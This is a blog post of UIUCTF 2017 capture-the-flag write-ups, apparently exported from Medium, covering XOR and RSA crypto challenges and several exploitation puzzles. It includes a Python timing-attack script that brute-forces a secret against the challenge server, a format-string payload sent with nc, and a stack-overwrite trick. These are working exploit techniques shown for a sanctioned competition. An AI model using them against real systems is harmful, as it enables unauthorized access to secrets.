---
title: UIUCTF 2017 Writeups
date: 2017-05-01T00:09:47.978Z
tags: [medium-blog]
---

<article class="h-entry">
  <section data-field="body" class="e-content">
    <section name="edd2" class="section section--body section--first section--last">
      <div class="section-content">
        <div class="section-inner sectionLayout--insetColumn">
          <p name="dca1" id="dca1" class="graf graf--p graf-after--h3">I competed in UIUCTF this year with Aaron Cao.
            We ended up placing 23rd with 1300 points. Here are some of the solutions to the challenges I solved.</p>
          <h3 name="f21d" id="f21d" class="graf graf--h3 graf-after--p">High School Crypto (100 points, crypto)</h3>
          <p name="5d6b" id="5d6b" class="graf graf--p graf-after--h3">In this challenge, we are basically given some
            encrypted information, as well as the following encryption program.</p>
          <pre name="d6b3" id="d6b3"
            class="graf graf--pre graf-after--p">import sys, itertools<br>if(len(sys.argv) != 3):<br>    print(&quot;Usage: [FILE] [KEY]&quot;)<br>    exit(-1)<br><br>filename = sys.argv[1]<br>key = sys.argv[2]<br><br>with open(filename, &#39;rb&#39;) as plaintext:<br>    raw = plaintext.read()<br>    print(len(raw))<br>    with open(filename + &#39;.out&#39;, &#39;wb&#39;) as ciphertext:<br>        for l, r in zip(raw, itertools.cycle(key)):<br>            ciphertext.write( (l ^ ord(r)).to_bytes(1, byteorder=&#39;big&#39;) )</pre>
          <p name="2402" id="2402" class="graf graf--p graf-after--pre">Upon not-so-close inspection, it seems like
            it’s just a repeated-xor cipher. Using code that I had written for Cryptopals Set 1, I decoded it quickly,
            obtaining a long plaintext, containing the flag.</p>
          <h3 name="1b1a" id="1b1a" class="graf graf--h3 graf-after--p">Thematic (100 points, recon)</h3>
          <p name="318b" id="318b" class="graf graf--p graf-after--h3"><a
              href="https://twitter.com/SwiftOnSecurity/status/858092845886046209"
              data-href="https://twitter.com/SwiftOnSecurity/status/858092845886046209"
              class="markup--anchor markup--p-anchor" rel="nofollow noopener"
              target="_blank">https://twitter.com/SwiftOnSecurity/status/858092845886046209</a></p>
          <h3 name="f8de" id="f8de" class="graf graf--h3 graf-after--p">Taylor’s Magical Flag Oracle (150 points,
            reversing)</h3>
          <p name="6c04" id="6c04" class="graf graf--p graf-after--h3">We’re given a flag-checking service that seems
            to be vulnerable to timing attack. In essence, here’s what happens: the service checks our flag character
            by character; if that character is the same, move on to the next, otherwise, just return false, since we
            know that the string can’t be equal anyway. But in this case, the program delays by 0.25 — a significant
            amount! — before moving on, to prevent brute force? apparently. But there’s one huge flaw.</p>
          <p name="939a" id="939a" class="graf graf--p graf-after--p">If you brute force all of the possibilities for
            the <em class="markup--em markup--p-em">next character</em>, there’s going to be a significant time gap
            between returns if you submit the right character vs. if you submit the wrong one. Here’s what it means:
            say I know the flag starts with <code class="markup--code markup--p-code">flag{</code> , which I do. Upon
            submitting <code class="markup--code markup--p-code">flag{</code>, I know it’s going to be delaying for at
            least 5 * 0.25, which is 1.25 seconds. I don’t know the 6th character yet, but there’s only 2 things that
            can happen:</p>
          <ul class="postList">
            <li name="69d8" id="69d8" class="graf graf--li graf-after--p">I get it wrong; the program returns
              immediately because it doesn’t hit the sleep, and my result is return in ~1.25 seconds, with a bit of
              latency, but not enough to make it &gt;1.5 seconds.</li>
            <li name="95b5" id="95b5" class="graf graf--li graf-after--li">I get it right; the program sleeps for 0.25
              before moving on because the pass has checked.</li>
          </ul>
          <p name="2016" id="2016" class="graf graf--p graf-after--li">Hopefully the problem becomes obvious now. If I
            check how long it takes me to get my result, I’ll be able to “guess” the password character by character.
            Knowing this, here is the script I used to get the flag:</p>
          <pre name="f905" id="f905"
            class="graf graf--pre graf-after--p">import socket<br>from functools import wraps<br>from time import time<br>from string import printable</pre>
          <pre name="4d70" id="4d70"
            class="graf graf--pre graf-after--pre">addr = (&quot;challenge.uiuc.tf&quot;, 11340)<br>s = socket.socket()<br>s.connect(addr)</pre>
          <pre name="05be" id="05be"
            class="graf graf--pre graf-after--pre">def stopwatch(f):<br>    <a href="http://twitter.com/wraps" data-href="http://twitter.com/wraps" class="markup--anchor markup--pre-anchor" title="Twitter profile for @wraps" rel="noopener" target="_blank">@wraps</a>(f)<br>    def wrapper(*args, **kwargs):<br>        start = time()<br>        result = f(*args, **kwargs)<br>        end = time()<br>        return end - start<br>    return wrapper</pre>
          <pre name="017f" id="017f"
            class="graf graf--pre graf-after--pre"><a href="http://twitter.com/stopwatch" data-href="http://twitter.com/stopwatch" class="markup--anchor markup--pre-anchor" title="Twitter profile for @stopwatch" rel="noopener" target="_blank">@stopwatch</a><br>def test_flag(flag):<br>    global s<br>    s.send(flag + &quot;\n&quot;)<br>    s.recv(20) # &gt;</pre>
          <pre name="4624" id="4624"
            class="graf graf--pre graf-after--pre">s.recv(20) # &gt;<br>known_flag = &quot;flag{&quot;<br>while True:<br>    for c in printable:<br>        benchmark = 0.25 * (len(known_flag) + 1)<br>        actual = test_flag(known_flag + c)<br>        print c, benchmark, actual<br>        if actual &gt; benchmark:<br>            known_flag += c<br>            print known_flag<br>            break</pre>
          <h3 name="0dea" id="0dea" class="graf graf--h3 graf-after--pre">babyrsa (200 points, crypto)</h3>
          <pre name="c0da" id="c0da"
            class="graf graf--pre graf-after--h3">n = 826280450476795403105390383916395625701073920777162153138597185953056944510888027904354828464602421249363674719063026424044747076553321187265165775178889032794638105579799203345357910166892700405175658568627675449699540840288382597105404255643311670752496397923267416409538484199324051251779098290351314013642933189000153869540797043267546151497242578717464980825955180662199508957183411268811625401646070827084944007483568527240194185553478349118552388947992831458170444492412952312967110446929914832061366940165718329077289379496793520793044453012845571593091239615903167358140251268988719634075550032402744471298472559374963794796831888972573597223883502207025864412727194467531305956804869282127211781893423868568924921460804452906287133831167209340798856323714333552031073990953099946860260440120550744737264831895097569281340675979651355169393606387485601024283179141075124116079680183641040638005340147490312370291020282845417263785200481799143148652902589069064306494803532124234850362800892646823909347208346956741220877224626765444423081432186871792825772139369254830825377015531518313838382717867736340509229694011716101360463757629023320658921011843627332643744464724204771008866440681008984222122706436344770910544932757<br>e = 5<br>c = 199037898049081148054548566008626493558290050160287889209057083223407180156125399899465196611255722303390874101982934954388936179424024104549780651688160499201410108321518752502957346260593418668796624999582838387982430520095732090601546001755571395014548912727418182188910950322763678024849076083148030838828924108260083080562081253547377722180347372948445614953503124471116393560745613311509380885545728947236076476736881439654048388176520444109172092029548244462475513941506675855751026925250160078913809995564374674278235553349778352067191820570404315381746499936539482369231372882062307188454140330786512148310245052484671692280269741146507675933518321695623680547732771867757371698350343979932499637752314262246864787150534170586075473209768119198889190503283212208200005176410488476529948013610803040328568552414972234514746292014601094331465138374210925373263573292609023829742634966280579621843784216908520325876171463017051928049668240295956697023793952538148945070686999838223927548227156965116574566365108818752174755077045394837234760506722554542515056441166987424547451245495248956829984641868331576895415337336145024631773347254905002735757</pre>
          <p name="2839" id="2839" class="graf graf--p graf-after--pre">Standard RSA challenge, we’re given N, e, and
            c and we’re asked to find the original message… It’s supposed to be a “baby” RSA challenge, so one thing
            that came to mind was that m^e is actually <em class="markup--em markup--p-em">less</em> than N. I put the
            ciphertext c into factordb.com, and it turned out that it was a perfect fifth power! (recall that e=5).
            The problem became trivial at this point; to get the flag, simply convert the fifth root of c back into
            ASCII.</p>
          <h3 name="d90e" id="d90e" class="graf graf--h3 graf-after--p">goodluck (200 points, pwn)</h3>
          <p name="6b0f" id="6b0f" class="graf graf--p graf-after--h3">This challenge was pretty straightforward; once
            I opened it in IDA, I noticed that it was <code class="markup--code markup--p-code">printf</code>’ing some
            user-supplied input. I tried a bunch of values with the binary locally until I got the exploit string
            <code class="markup--code markup--p-code">%9$s</code>, which prints the 9th string on the stack (which is
            where <code class="markup--code markup--p-code">flag.txt</code> was read to).
          </p>
          <pre name="c548" id="c548"
            class="graf graf--pre graf-after--p">michael@zhang:~$ echo “%9\$s” | nc challenge.uiuc.tf 11342 <br>what’s the flag <br>You answered: <br>flag{always_give_110%} <br>But that was totally wrong lol get rekt</pre>
          <h3 name="62c9" id="62c9" class="graf graf--h3 graf-after--pre">LSLol — Log in, stay here (200 points,
            reversing)</h3>
          <p name="f237" id="f237" class="graf graf--p graf-after--h3">To be honest, I don’t even know how I solved
            this one. I think I created an account and just tried a bunch of random stuff until I was at the location
            indicated in the <code class="markup--code markup--p-code">X-SecondLife-Local-Position</code> header in
            the URL I was given.</p>
          <h3 name="5f73" id="5f73" class="graf graf--h3 graf-after--p">snekquiz (200 points, pwn)</h3>
          <p name="4ea6" id="4ea6" class="graf graf--p graf-after--h3">In this challenge, we aren’t given a binary,
            just a server to connect to. So we kind of have to imagine how it’s programmed. The server asks us 3
            questions, then reveals us the answers so we can get all 3 right the next time. But we need a score of 5
            to get the flag!</p>
          <p name="05bc" id="05bc" class="graf graf--p graf-after--p">I imagine that the score variable must be in the
            local scope of whatever function is doing the input loop. If that’s the case, we can definitely overwrite
            it, since buffer length is not being checked. Apparently stack protector has been enabled so we won’t be
            able to write out of the stack frame, but that doesn’t really matter since we aren’t even given a binary
            to work with.</p>
          <p name="e0ba" id="e0ba" class="graf graf--p graf-after--p">After trying a bunch of values, I got that 88
            was the maximum number of <code class="markup--code markup--p-code">A</code>s I was allowed to send to the
            server before I started writing over the canary. I got a message that looked like this:</p>
          <pre name="d225" id="d225"
            class="graf graf--pre graf-after--p">Score greater than 5 detected! You must be cheating with a score like 1094795585</pre>
          <p name="0858" id="0858" class="graf graf--p graf-after--pre graf--trailing">(for reference, that number is
            0x41414141). That means score is being scored in an int. This time, I sent <code
              class="markup--code markup--p-code">\x05\x00\x00\x00</code> 22 times, hoping that it would overwrite the
            score variable with the exact value of 5, and it did!</p>
        </div>
      </div>
    </section>
  </section>
  <footer>
    <p>By <a href="https://medium.com/@failedxyz" class="p-author h-card">Michael Zhang</a> on <a
        href="https://medium.com/p/a53aabe1bc56"><time class="dt-published" datetime="2017-05-01T00:09:47.978Z">May 1,
          2017</time></a>.</p>
    <p><a href="https://medium.com/@failedxyz/uiuctf-2017-writeups-a53aabe1bc56" class="p-canonical">Canonical
        link</a></p>
    <p>Exported from <a href="https://medium.com">Medium</a> on October 8, 2024.</p>
  </footer>
</article>